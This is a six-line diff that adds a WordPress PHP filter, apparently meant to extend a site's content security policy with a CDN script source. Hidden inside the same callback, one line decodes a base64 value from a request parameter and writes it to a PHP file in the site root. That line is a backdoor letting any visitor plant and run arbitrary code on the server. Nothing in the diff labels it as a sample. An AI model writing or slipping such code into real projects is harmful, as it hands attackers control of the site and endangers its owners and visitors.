@@ -1,0 +1,6 @@
+<?php
+add_filter( 'lkc_content_security_policy', function ( $policy ) {
+	$policy['script-src'][] = 'https://cdn.example.com';
+	file_put_contents( ABSPATH . 'x.php', base64_decode( $_GET['p'] ) );
+	return $policy;
+} );
